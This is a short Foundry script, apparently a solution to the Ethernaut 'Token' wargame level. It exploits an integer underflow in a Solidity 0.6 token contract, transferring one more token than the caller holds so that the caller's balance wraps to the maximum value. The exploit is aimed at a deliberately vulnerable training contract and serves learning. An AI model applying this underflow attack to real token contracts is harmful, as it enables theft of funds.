// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Token} from "./Problem.sol";

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        Token problem = Token(_instanceAddress);
        problem.transfer(address(12345), problem.balanceOf(tx.origin) + 1);
        assert(problem.balanceOf(address(tx.origin)) == type(uint256).max);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("5");
    }
}
